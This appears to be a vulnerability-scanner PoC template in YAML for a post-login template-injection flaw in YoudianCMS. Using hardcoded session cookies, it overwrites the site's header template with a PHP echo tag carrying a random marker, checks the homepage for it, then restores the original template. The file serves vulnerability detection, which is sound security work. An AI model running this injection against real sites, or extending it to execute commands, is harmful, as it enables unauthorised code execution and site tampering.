name: poc-yaml-youdiancms-post-auth-ssti-rce
binding: 0c3312ce-40cc-44f5-8a87-1d397e3e739f
manual: true
detail:
    author: xxtx
    links:
        - http://cve.scap.org.cn/vuln/VHN-379856
    vulnerability:
        level: critical
    check_action: need login, set 'sid'、'PHPSESSID'
transport: http
set:
    rboundary: randomLowercase(29)
    r1: randomLowercase(8)
    sid: b"3i7e5a8op22n3v4euj0ilg54f1"
    PHPSESSID: b"uli94cbcppthe489s25l1u98pr"
rules:
    r0:
        request:
            cache: true
            method: POST
            path: ^/index.php/Admin/template/saveModify
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
                Cookie: sid={{sid}}; PHPSESSID={{PHPSESSID}};
            body: |-
                -----------------------------{{rboundary}}
                Content-Disposition: form-data; name="FileName"

                /Public/header.html
                -----------------------------{{rboundary}}
                Content-Disposition: form-data; name="FileContent"

                <!--区块5000 开始-->
                <?={{r1}}?>
                <div id="n5000" class="component floor_head0_main" yd-add="1" yd-delete="1" yd-order="1" yd-group="5000" yd-content="channel">
                    <style type="text/css">
                        #n5000{
                            {$THead0Bg5000|ParseBg}
                        }
                        #n5000 .floor_head0_shade2{
                            {$THead0Bg5000|ParseBg} opacity: {$THead0BgColorOpacity5000}; height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 .floor_head0.istop,#n5000 .floor_head0.navigation-style1,#n5000 .floor_head0.navigation-style3{
                            {$THead0Bg5000|ParseBg}
                        }
                        #n5000 .floor_head0{
                            padding: {$THead0Padding5000}px 0;
                        }
                        #n5000 .logo img{
                            height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 .navigation{
                            text-align: {$THead0NavigationAlign5000};
                        }
                        #n5000 .navigation ul.navigationlist li{
                            line-height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 .navigation ul.navigationlist>li>a{
                            {$THead0NavigationFont5000|ParseFont}
                            padding-left: {$THead0NavigationSpace5000}px; padding-right: {$THead0NavigationSpace5000}px;
                        }
                        #n5000 .subnavigationlist{
                            {$THead0SubNavigationBg5000|ParseBg}
                        }
                        #n5000 .subnavigationlist a{
                            {$THead0SubNavigationFont5000|ParseFont}
                        }
                        #n5000 .user{
                            line-height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 #member a{
                            {$THead0MemberFont5000|ParseFont}
                        }
                    </style>
                    <i class="floor_head0_shade{$THead0Style5000}"></i>
                    <div class="floor_head0 navigation-style{$THead0Style5000}">
                        <div class="head0 full-width{$THead0FullWidth5000}">
                            <div class="logo" yd-content="basic">
                                <a href="{:HomeUrl()}" target="_self">
                                    <img src="{$WebLogo}" title="{$WebName}" alt="{$WebName}" />
                                 </a>
                            </div>
                            <div class="user">
                                <notempty name="THead0ShowMember5000"><div id="member" class="member" yd-content="reg"></div></notempty>
                                <notempty name="THead0ShowLanguage5000">
                                    <notempty name="Language">
                                        <div class="language" yd-content="language">
                                            <eq name="HomeLanguageMark" value="en"><a class="ThemeColorBg" href="{:LanguageUrl('cn')}" target="_self">中</a></eq>
                                            <eq name="HomeLanguageMark" value="cn"><a class="ThemeColorBg" href="{:LanguageUrl('en')}" target="_self">EN</a></eq>
                                        </div>
                                    </notempty>
                                </notempty>
                            </div>
                            <div class="navigation">
                                <ul class="navigationlist">
                                    <i class="nav_active ThemeColorBg"></i>
                                    <channellist id="c1" channelid="0">
                                        <neq name="i" value="1"><li class="separator"><span>{$THead0NavigationSeparator5000}</span></li></neq>
                                        <li>
                                            <a href="{$c1.ChannelUrl}" target="{$c1.ChannelTarget}" class="<eq name='c1.ChannelID' value='$TopChannelID'>ThemeColor</eq> ThemeColorHover">{$c1.ChannelName}</a>
                                            <eq name="c1.HasChild" value="1">
                                                <ul class="subnavigationlist">
                                                    <channellist id="c2" channelid="$c1.ChannelID">
                                                        <li><a class="ThemeColorBgHover" href="{$c2.ChannelUrl}" target="{$c2.ChannelTarget}">{$c2.ChannelName}</a></li>
                                                    </channellist>
                                                </ul>
                                            </eq>
                                        </li>
                                    </channellist>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <script>
                        $(function(){
                            //用户
                            pageInit();
                            function pageInit(){
                                if( $("#n5000 #member").length > 0 ){
                                    if( "{$EnableHtml}" == 1 ){
                                        $.get("{:JsonUrl()}", null, function(data){ UpdateLoginStatus(data['MemberID'], data['MemberName'], data['EnableMember']); },"json");
                                    }else{
                                        UpdateLoginStatus("{$MemberID}", "{$MemberName}", "{$EnableMember}");
                                    }
                                }
                            }
                            function UpdateLoginStatus(id, name, flag){
                                if(flag==0){
                                    $("#n5000 #member").remove();
                                    return;
                                }
                                var html = "";
                                if( id ){
                                    html += '<a href="{:MemberUrl()}" target="_blank" class="MemberName">'+name+'</a>';
                                    html += '<a href="{:MemberLogoutUrl()}" target="_self" style="color: red;">{$Think.lang.MemberQuit}</a>';
                                }else{
                                    html += '<a href="{:MemberLoginUrl()}" target="_self">{$Think.lang.Login}</a>';
                                    html += '<a href="{:MemberRegUrl()}" target="_self">{$Think.lang.Reg}</a>';
                                }
                                $("#n5000 #member").html( html );
                            }
                            // pc导航栏js
                            $('#n5000 ul.navigationlist li').mousemove(function(){
                                if($(this).find('ul').is(":animated")) return;
                                $(this).find('ul').slideDown(280);
                            });
                            $('#n5000 ul.navigationlist li').mouseleave(function(){
                                $(this).find('ul').slideUp(280);
                            });

                            $('#n5000 .nav_active').css({
                                width: $('#n5000 .navigationlist li a.ThemeColor').parent().width(),
                                left: $('#n5000 .navigationlist li a.ThemeColor').parent()[0] && $('#n5000 .navigationlist li a.ThemeColor').parent()[0].offsetLeft,
                            });
                            $('#n5000 .navigationlist li').mousemove(function(){
                                $('#n5000 .nav_active').css({
                                    width: $(this).width(),
                                    left: $(this)[0].offsetLeft
                                });
                            })
                            $('#n5000 .navigationlist li').mouseleave(function(){
                                $('#n5000 .nav_active').css({
                                    width: $('#n5000 .navigationlist li a.ThemeColor').parent().width(),
                                    left: $('#n5000 .navigationlist li a.ThemeColor').parent()[0] && $('#n5000 .navigationlist li a.ThemeColor').parent()[0].offsetLeft,
                                });
                            })

                            $('#n5000 .subnavigationlist').mousemove(function(){
                                $('#n5000 .nav_active').css('left', $(this).parent()[0].offsetLeft);
                            })

                            if($('#n5000').find('.floor_head0').hasClass('navigation-style2')){
                                $('#n5000').height('0')
                            }else{
                                $('#n5000').height($('#n5000').height()+'px')
                            }
                            // 头部固定
                            function logoMainChange(){
                                if($('#n5000').offset().top <= $(window).scrollTop()){
                                    $('#n5000').addClass('istop');
                                }else{
                                    $('#n5000').removeClass('istop');
                                }
                            }
                            // 滚动事件
                            $(window).scroll(function(){
                                logoMainChange();
                            });
                        })
                    </script>
                </div>
                <!--区块5000 结束--><!-- wap LOGO 开始-->
                <div id="wap_logo_main">
                  <div id="wap_logo">
                     <notempty name="WebLogo">
                       <div id="menu"></div>
                       <div class="WebLogo">
                               <a class="WebLogo" href="{:HomeUrl()}"><img src="{$WebLogo}" /></a>
                               <notempty name="Language">
                            <eq name="HomeLanguageMark" value="en"><a class="languagebtn ThemeColorBg" href="{:LanguageUrl('cn')}" target="_self">中</a></eq>
                            <eq name="HomeLanguageMark" value="cn"><a class="languagebtn ThemeColorBg" href="{:LanguageUrl('en')}" target="_self">EN</a></eq>
                        </notempty>
                               <a class="shownavbtn" href="javascript:;"></a>
                           </div>
                     </notempty>
                  </div>
                </div>
                <!--wap Logo 结束-->

                <!--wap 导航 开始-->
                <div id="wap_navigation">
                    <i id="wap_navigationshade"></i>
                    <ul class="wap_navigationlist">
                        <div class="seachwrap">
                            <form name="frmInfoSearch" method="post" action="{:InfoSearchAction()}">
                                <input class="Keywords" name="Keywords" value="{$SearchWord}" type="text" placeholder="{$Think.lang.InputKeyword}"/>
                                <input class="btnSearch" name="btnSearch" class="btn" type="submit" value=""  />
                            </form>
                        </div>
                        <navigationlist id="n1" channelid="0" depth="1">
                            <li class="depth0">
                                  <a href="{$n1.ChannelUrl}" class='<eq name="n1.ChannelID" value="$TopChannelID">ThemeColor</eq> minBorderBottom'>{$n1.ChannelName}</a>
                                  <eq name="n1.HasChild" value="1">
                                      <i class="showmore"></i>
                                      <ul class="wap_subnavigationlist">
                                          <navigationlist id="n2" channelid="$n1.ChannelID" depth="2">
                                              <li class="depth{$n2.ChannelDepth}"><a class="minBorderBottom" href="{$n2.ChannelUrl}">{$n2.ChannelName}</a></li>
                                          </navigationlist>
                                      </ul>
                                  </eq>
                            </li>
                        </navigationlist>
                    </ul>
                </div>
                <script>
                    $(function(){
                        // wap导航栏js
                        $(".shownavbtn").click(function(){
                            navshow();
                        });
                        $("#wap_navigationshade").click(function(){
                            navhide();
                        });
                        $("#wap_navigation .showmore").click(function(){
                            if(!$(this).hasClass('clockwiseRotate')){
                                $(this).removeClass("anticlockwiseRotate").addClass("clockwiseRotate animated").next().show().addClass("animate__animated animate__fadeInRight");
                            }else{
                                $(this).removeClass("clockwiseRotate").addClass("anticlockwiseRotate").next().removeClass("animate__fadeInRight").fadeOut(100);
                            }
                        })
                        function navshow(){
                            var duration = 0.5;
                            $("#wap_navigationshade").show();
                            $(this).removeClass("nav_clear").addClass("nav_show");
                            $(".wap_navigationlist").removeClass("click_slideOutRight").addClass("click_slideInRight animated");
                            $(".wap_navigationlist li.depth0").each(function(index){
                                $(this).addClass("animate__animated animate__fadeInRight");
                                $(this).css("animation-duration", (duration += 0.1) + 's');
                            });
                        };
                        function navhide(){
                            $("#wap_navigationshade").hide();
                            $(this).removeClass("nav_show").addClass("nav_clear");
                            $(".wap_navigationlist").removeClass("click_slideInRight").addClass("click_slideOutRight animated").find("li").removeClass("animate__fadeInRight");
                        };
                    })
                </script>
                <!--wap 导航 结束-->
                <notin name="channelid" value="1,2">
                    <div class="banner_img">
                    <notempty name="ChannelPicture">
                        <img src="{$ChannelPicture}" />
                    <else/>
                        <img src="{$TopChannelID|ChannelPicture}" />
                    </notempty>
                    </div>
                </notin>
                -----------------------------{{rboundary}}
            follow_redirects: false
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: GET
            path: ^/index.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(r1))
    r2:
        request:
            cache: true
            method: POST
            path: ^/index.php/Admin/template/saveModify
            headers:
                Content-Type: multipart/form-data; boundary=---------------------------{{rboundary}}
                Cookie: sid={{sid}}; PHPSESSID={{PHPSESSID}}; youdianAdminLangSet={{youdianAdminLangSet}};
            body: |-
                -----------------------------{{rboundary}}
                Content-Disposition: form-data; name="FileName"

                /Public/header.html
                -----------------------------{{rboundary}}
                Content-Disposition: form-data; name="FileContent"

                <!--区块5000 开始-->
                <div id="n5000" class="component floor_head0_main" yd-add="1" yd-delete="1" yd-order="1" yd-group="5000" yd-content="channel">
                    <style type="text/css">
                        #n5000{
                            {$THead0Bg5000|ParseBg}
                        }
                        #n5000 .floor_head0_shade2{
                            {$THead0Bg5000|ParseBg} opacity: {$THead0BgColorOpacity5000}; height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 .floor_head0.istop,#n5000 .floor_head0.navigation-style1,#n5000 .floor_head0.navigation-style3{
                            {$THead0Bg5000|ParseBg}
                        }
                        #n5000 .floor_head0{
                            padding: {$THead0Padding5000}px 0;
                        }
                        #n5000 .logo img{
                            height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 .navigation{
                            text-align: {$THead0NavigationAlign5000};
                        }
                        #n5000 .navigation ul.navigationlist li{
                            line-height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 .navigation ul.navigationlist>li>a{
                            {$THead0NavigationFont5000|ParseFont}
                            padding-left: {$THead0NavigationSpace5000}px; padding-right: {$THead0NavigationSpace5000}px;
                        }
                        #n5000 .subnavigationlist{
                            {$THead0SubNavigationBg5000|ParseBg}
                        }
                        #n5000 .subnavigationlist a{
                            {$THead0SubNavigationFont5000|ParseFont}
                        }
                        #n5000 .user{
                            line-height: {$THead0LogoHeight5000}px;
                        }
                        #n5000 #member a{
                            {$THead0MemberFont5000|ParseFont}
                        }
                    </style>
                    <i class="floor_head0_shade{$THead0Style5000}"></i>
                    <div class="floor_head0 navigation-style{$THead0Style5000}">
                        <div class="head0 full-width{$THead0FullWidth5000}">
                            <div class="logo" yd-content="basic">
                                <a href="{:HomeUrl()}" target="_self">
                                    <img src="{$WebLogo}" title="{$WebName}" alt="{$WebName}" />
                                 </a>
                            </div>
                            <div class="user">
                                <notempty name="THead0ShowMember5000"><div id="member" class="member" yd-content="reg"></div></notempty>
                                <notempty name="THead0ShowLanguage5000">
                                    <notempty name="Language">
                                        <div class="language" yd-content="language">
                                            <eq name="HomeLanguageMark" value="en"><a class="ThemeColorBg" href="{:LanguageUrl('cn')}" target="_self">中</a></eq>
                                            <eq name="HomeLanguageMark" value="cn"><a class="ThemeColorBg" href="{:LanguageUrl('en')}" target="_self">EN</a></eq>
                                        </div>
                                    </notempty>
                                </notempty>
                            </div>
                            <div class="navigation">
                                <ul class="navigationlist">
                                    <i class="nav_active ThemeColorBg"></i>
                                    <channellist id="c1" channelid="0">
                                        <neq name="i" value="1"><li class="separator"><span>{$THead0NavigationSeparator5000}</span></li></neq>
                                        <li>
                                            <a href="{$c1.ChannelUrl}" target="{$c1.ChannelTarget}" class="<eq name='c1.ChannelID' value='$TopChannelID'>ThemeColor</eq> ThemeColorHover">{$c1.ChannelName}</a>
                                            <eq name="c1.HasChild" value="1">
                                                <ul class="subnavigationlist">
                                                    <channellist id="c2" channelid="$c1.ChannelID">
                                                        <li><a class="ThemeColorBgHover" href="{$c2.ChannelUrl}" target="{$c2.ChannelTarget}">{$c2.ChannelName}</a></li>
                                                    </channellist>
                                                </ul>
                                            </eq>
                                        </li>
                                    </channellist>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <script>
                        $(function(){
                            //用户
                            pageInit();
                            function pageInit(){
                                if( $("#n5000 #member").length > 0 ){
                                    if( "{$EnableHtml}" == 1 ){
                                        $.get("{:JsonUrl()}", null, function(data){ UpdateLoginStatus(data['MemberID'], data['MemberName'], data['EnableMember']); },"json");
                                    }else{
                                        UpdateLoginStatus("{$MemberID}", "{$MemberName}", "{$EnableMember}");
                                    }
                                }
                            }
                            function UpdateLoginStatus(id, name, flag){
                                if(flag==0){
                                    $("#n5000 #member").remove();
                                    return;
                                }
                                var html = "";
                                if( id ){
                                    html += '<a href="{:MemberUrl()}" target="_blank" class="MemberName">'+name+'</a>';
                                    html += '<a href="{:MemberLogoutUrl()}" target="_self" style="color: red;">{$Think.lang.MemberQuit}</a>';
                                }else{
                                    html += '<a href="{:MemberLoginUrl()}" target="_self">{$Think.lang.Login}</a>';
                                    html += '<a href="{:MemberRegUrl()}" target="_self">{$Think.lang.Reg}</a>';
                                }
                                $("#n5000 #member").html( html );
                            }

                            // pc导航栏js
                            $('#n5000 ul.navigationlist li').mousemove(function(){
                                if($(this).find('ul').is(":animated")) return;
                                $(this).find('ul').slideDown(280);
                            });
                            $('#n5000 ul.navigationlist li').mouseleave(function(){
                                $(this).find('ul').slideUp(280);
                            });

                            $('#n5000 .nav_active').css({
                                width: $('#n5000 .navigationlist li a.ThemeColor').parent().width(),
                                left: $('#n5000 .navigationlist li a.ThemeColor').parent()[0] && $('#n5000 .navigationlist li a.ThemeColor').parent()[0].offsetLeft,
                            });
                            $('#n5000 .navigationlist li').mousemove(function(){
                                $('#n5000 .nav_active').css({
                                    width: $(this).width(),
                                    left: $(this)[0].offsetLeft
                                });
                            })
                            $('#n5000 .navigationlist li').mouseleave(function(){
                                $('#n5000 .nav_active').css({
                                    width: $('#n5000 .navigationlist li a.ThemeColor').parent().width(),
                                    left: $('#n5000 .navigationlist li a.ThemeColor').parent()[0] && $('#n5000 .navigationlist li a.ThemeColor').parent()[0].offsetLeft,
                                });
                            })

                            $('#n5000 .subnavigationlist').mousemove(function(){
                                $('#n5000 .nav_active').css('left', $(this).parent()[0].offsetLeft);
                            })

                            if($('#n5000').find('.floor_head0').hasClass('navigation-style2')){
                                $('#n5000').height('0')
                            }else{
                                $('#n5000').height($('#n5000').height()+'px')
                            }
                            // 头部固定
                            function logoMainChange(){
                                if($('#n5000').offset().top <= $(window).scrollTop()){
                                    $('#n5000').addClass('istop');
                                }else{
                                    $('#n5000').removeClass('istop');
                                }
                            }
                            // 滚动事件
                            $(window).scroll(function(){
                                logoMainChange();
                            });
                        })
                    </script>
                </div>
                <!--区块5000 结束--><!-- wap LOGO 开始-->
                <div id="wap_logo_main">
                  <div id="wap_logo">
                     <notempty name="WebLogo">
                       <div id="menu"></div>
                       <div class="WebLogo">
                               <a class="WebLogo" href="{:HomeUrl()}"><img src="{$WebLogo}" /></a>
                               <notempty name="Language">
                            <eq name="HomeLanguageMark" value="en"><a class="languagebtn ThemeColorBg" href="{:LanguageUrl('cn')}" target="_self">中</a></eq>
                            <eq name="HomeLanguageMark" value="cn"><a class="languagebtn ThemeColorBg" href="{:LanguageUrl('en')}" target="_self">EN</a></eq>
                        </notempty>
                               <a class="shownavbtn" href="javascript:;"></a>
                           </div>
                     </notempty>
                  </div>
                </div>
                <!--wap Logo 结束-->

                <!--wap 导航 开始-->
                <div id="wap_navigation">
                    <i id="wap_navigationshade"></i>
                    <ul class="wap_navigationlist">
                        <div class="seachwrap">
                            <form name="frmInfoSearch" method="post" action="{:InfoSearchAction()}">
                                <input class="Keywords" name="Keywords" value="{$SearchWord}" type="text" placeholder="{$Think.lang.InputKeyword}"/>
                                <input class="btnSearch" name="btnSearch" class="btn" type="submit" value=""  />
                            </form>
                        </div>
                        <navigationlist id="n1" channelid="0" depth="1">
                            <li class="depth0">
                                  <a href="{$n1.ChannelUrl}" class='<eq name="n1.ChannelID" value="$TopChannelID">ThemeColor</eq> minBorderBottom'>{$n1.ChannelName}</a>
                                  <eq name="n1.HasChild" value="1">
                                      <i class="showmore"></i>
                                      <ul class="wap_subnavigationlist">
                                          <navigationlist id="n2" channelid="$n1.ChannelID" depth="2">
                                              <li class="depth{$n2.ChannelDepth}"><a class="minBorderBottom" href="{$n2.ChannelUrl}">{$n2.ChannelName}</a></li>
                                          </navigationlist>
                                      </ul>
                                  </eq>
                            </li>
                        </navigationlist>
                    </ul>
                </div>
                <script>
                    $(function(){
                        // wap导航栏js
                        $(".shownavbtn").click(function(){
                            navshow();
                        });
                        $("#wap_navigationshade").click(function(){
                            navhide();
                        });
                        $("#wap_navigation .showmore").click(function(){
                            if(!$(this).hasClass('clockwiseRotate')){
                                $(this).removeClass("anticlockwiseRotate").addClass("clockwiseRotate animated").next().show().addClass("animate__animated animate__fadeInRight");
                            }else{
                                $(this).removeClass("clockwiseRotate").addClass("anticlockwiseRotate").next().removeClass("animate__fadeInRight").fadeOut(100);
                            }
                        })
                        function navshow(){
                            var duration = 0.5;
                            $("#wap_navigationshade").show();
                            $(this).removeClass("nav_clear").addClass("nav_show");
                            $(".wap_navigationlist").removeClass("click_slideOutRight").addClass("click_slideInRight animated");
                            $(".wap_navigationlist li.depth0").each(function(index){
                                $(this).addClass("animate__animated animate__fadeInRight");
                                $(this).css("animation-duration", (duration += 0.1) + 's');
                            });
                        };
                        function navhide(){
                            $("#wap_navigationshade").hide();
                            $(this).removeClass("nav_show").addClass("nav_clear");
                            $(".wap_navigationlist").removeClass("click_slideInRight").addClass("click_slideOutRight animated").find("li").removeClass("animate__fadeInRight");
                        };
                    })
                </script>
                <!--wap 导航 结束-->
                <notin name="channelid" value="1,2">
                    <div class="banner_img">
                    <notempty name="ChannelPicture">
                        <img src="{$ChannelPicture}" />
                    <else/>
                        <img src="{$TopChannelID|ChannelPicture}" />
                    </notempty>
                    </div>
                </notin>
                -----------------------------{{rboundary}}
            follow_redirects: false
        expression: response.status == 200
expression: r0() && r1() && r2()
